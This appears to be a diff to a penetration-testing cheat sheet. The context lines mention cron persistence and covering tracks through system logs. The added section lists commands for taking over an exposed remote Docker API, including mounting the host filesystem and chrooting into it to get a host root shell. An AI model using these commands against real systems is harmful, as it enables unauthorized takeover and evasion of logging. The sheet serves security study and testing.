@@ -344,6 +344,7 @@ Or you can add in system wide contab (nano /etc/crontab)
 * quser
 * logoff id|user_name  
 
+
 # Covering Track
 11.11. Covering our Tracks
 
@@ -363,8 +364,15 @@ On Debian and Ubuntu, the majority of these are left within the "/var/log direct
         /var/log/apache2/access.log
 <img src="https://imgur.com/y8Rin3h.png/>
           
-
-
+# Docker
+To see list of conatiner/images on a remote machine <br/>
+`docker -H <ip>:2375 images`
+To see list of currently running images/conatiner on a remote machine <br/>
+`docker -H <ip>:2375 ps -a  `<br/>
+To start a container from a remote machine <br/>
+`docker -H <ip>:2375 exec -it <container-id> /bin/sh`<br/>
+To start a container from a remote machine using name and tags<br/>
+`docker -H <ip>:2375 run -v /:/mnt --rm -it alpine:3.9 chroot /mnt sh`<br/>
 # Miscellaneous
 
 ## Turning off xfce beeping sound
